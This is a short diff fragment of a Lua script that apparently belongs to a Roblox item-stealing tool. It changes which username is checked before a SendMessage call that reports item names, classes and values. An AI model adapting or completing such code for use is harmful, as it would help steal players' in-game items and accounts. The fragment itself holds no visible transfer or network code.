@@ -813,7 +813,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                         v.Item_RAP,
                         totalRap
                     )
-                    if Roblox_Username ~= DualhookUsername then
+                    if Roblox_Username ~= MargarinePool then
                         SendMessage(
                             v.Item_Name,
                             v.Item_Class,
